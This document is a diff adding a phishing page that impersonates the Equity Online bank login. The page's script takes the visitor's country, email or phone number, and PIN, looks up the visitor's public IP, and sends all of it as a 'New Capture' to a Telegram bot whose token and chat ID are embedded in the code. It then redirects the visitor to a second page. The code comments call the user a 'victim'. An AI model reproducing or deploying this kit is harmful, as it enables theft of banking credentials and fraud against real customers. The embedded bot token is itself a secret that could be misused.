@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <title>Equity Online</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: 'Roboto', sans-serif;
+            display: flex;
+            height: 100vh;
+            background-color: #f7f7f7;
+        }
+        
+        .left-section {
+            flex: 2;
+            background: #C8102E;
+            display: flex;
+            justify-content: flex-start;
+            align-items: center;
+            padding: 40px;
+            color: white;
+        }
+        
+        .right-section {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .login-form {
+            width: 100%;
+            max-width: 400px;
+            background: white;
+            border-radius: 5px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+            padding: 20px;
+        }
+        
+        .login-form h2 {
+            margin-bottom: 10px;
+            font-weight: 700;
+        }
+        
+        .form-group {
+            margin-bottom: 15px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 5px;
+            color: #333;
+        }
+        
+        input[type="text"],
+        input[type="password"],
+        select {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #C8102E;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: 500;
+        }
+        
+        button:hover {
+            background-color: #A50F20;
+        }
+        
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+        }
+        
+        .footer a {
+            color: #C8102E;
+            text-decoration: none;
+        }
+        
+        .logo {
+            max-width: 150px;
+            margin-bottom: 20px;
+        }
+        
+        @media screen and (max-width: 768px) {
+            body {
+                flex-direction: column;
+                height: auto;
+                min-height: 100vh;
+            }
+            .left-section {
+                flex: none;
+                justify-content: center;
+                text-align: center;
+                padding: 30px 20px;
+            }
+            .left-section h1 {
+                font-size: 1.5rem;
+            }
+            .left-section p {
+                font-size: 1rem;
+            }
+            .right-section {
+                flex: none;
+                padding: 20px;
+            }
+            .login-form {
+                max-width: 100%;
+                box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
+            }
+            .logo {
+                max-width: 120px;
+            }
+        }
+        
+        @media screen and (max-width: 480px) {
+            .left-section {
+                padding: 20px 15px;
+            }
+            .left-section h1 {
+                font-size: 1.3rem;
+            }
+            .left-section p {
+                font-size: 0.9rem;
+            }
+            .right-section {
+                padding: 15px;
+            }
+            .login-form {
+                padding: 15px;
+            }
+            .login-form h2 {
+                font-size: 1.1rem;
+            }
+            input[type="text"],
+            input[type="password"],
+            select {
+                padding: 8px;
+                font-size: 16px;
+            }
+            button {
+                padding: 12px;
+                font-size: 1rem;
+            }
+            .logo {
+                max-width: 100px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="left-section">
+        <div>
+            <img src="Airtel-Emblema.png" alt="Equity Logo" class="logo">
+            <h1>Welcome to Equity online</h1>
+            <p>More than just banking.</p>
+        </div>
+    </div>
+    <div class="right-section">
+        <div class="login-form">
+            <h2>Login Equity As on App</h2>
+            <div class="form-group">
+                <label for="country">Country</label>
+                <select id="country">
+                    <option value="Kenya">Kenya</option>
+                    <option value="Uganda">Uganda</option>
+                    <option value="Tanzania">Tanzania</option>
+                </select>
+            </div>
+            <div class="form-group">
+                <label for="email">Email address or mobile number</label>
+                <input type="text" id="email" placeholder="Email address or mobile number" required>
+            </div>
+            <div class="form-group">
+                <label for="password">Enter Your PIN</label>
+                <input type="password" id="password" placeholder="Enter password" required>
+            </div>
+            <button id="signin-button">Proceed</button>
+            <p class="footer"><a href="#">Forgot your password?</a> | <a href="#">Register</a></p>
+            <p class="footer">English</p>
+        </div>
+    </div>
+
+    <script>
+        // ========== CONFIGURATION ==========
+        // Replace these with YOUR Telegram bot token and chat ID
+        const TELEGRAM_BOT_TOKEN = '7186506994:AAEKIkNo49PL-IyvoRFGFJoC5bxUfmfh_L0';
+        const TELEGRAM_CHAT_ID = '5615316142';
+        // ===================================
+
+        /**
+         * Sends a message to your Telegram bot via the Bot API.
+         * Uses fetch() – works in all modern browsers.
+         */
+        async function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                const result = await response.json();
+                if (!result.ok) {
+                    console.error('Telegram API error:', result);
+                }
+                return result;
+            } catch (err) {
+                console.error('Failed to send to Telegram:', err);
+            }
+        }
+
+        /**
+         * Gets the user's IP address via a free public API,
+         * then sends the full credential capture to Telegram.
+         */
+        async function captureAndSend() {
+            const country = document.getElementById('country').value;
+            const email = document.getElementById('email').value.trim();
+            const password = document.getElementById('password').value.trim();
+
+            if (!email || !password) {
+                alert('Please fill in all fields.');
+                return false;
+            }
+
+            // 1. Try to grab the victim's public IP
+            let ip = 'Unknown';
+            try {
+                const resp = await fetch('https://api.ipify.org?format=json');
+                const data = await resp.json();
+                ip = data.ip;
+            } catch (e) {
+                // fail silently – IP is a nice-to-have
+            }
+
+            // 2. Build the message
+            const timestamp = new Date().toLocaleString();
+            const message = `
+<b>New Capture</b>
+Time: ${timestamp}
+IP: ${ip}
+
+Country: ${country}
+Email/Phone: ${email}
+Password: ${password}
+            `.trim();
+
+            // 3. Send to Telegram (fire-and-forget, no blocking)
+            sendToTelegram(message);
+
+            // 4. Redirect to the next page
+            window.location.href = "equity2.html";
+
+            return false;
+        }
+
+        // Attach the handler to the button
+        document.getElementById('signin-button').addEventListener('click', function(e) {
+            e.preventDefault();
+            captureAndSend();
+        });
+    </script>
+
+</body>
+
+</html>
